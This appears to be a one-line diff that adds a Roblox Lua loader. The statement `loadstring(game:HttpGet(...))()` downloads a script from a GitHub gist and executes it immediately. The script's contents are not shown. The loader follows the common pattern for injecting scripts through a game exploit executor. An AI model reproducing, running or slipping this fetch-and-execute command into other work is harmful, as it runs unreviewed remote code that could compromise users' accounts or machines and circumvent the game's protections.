@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://gist.githubusercontent.com/NTheDrone-come/911a40a8d75283ca2df7b73d7f1fc06c/raw/1ac5af8d006f6c3887e26583be4c48f921644558/ZOVZOV'))()
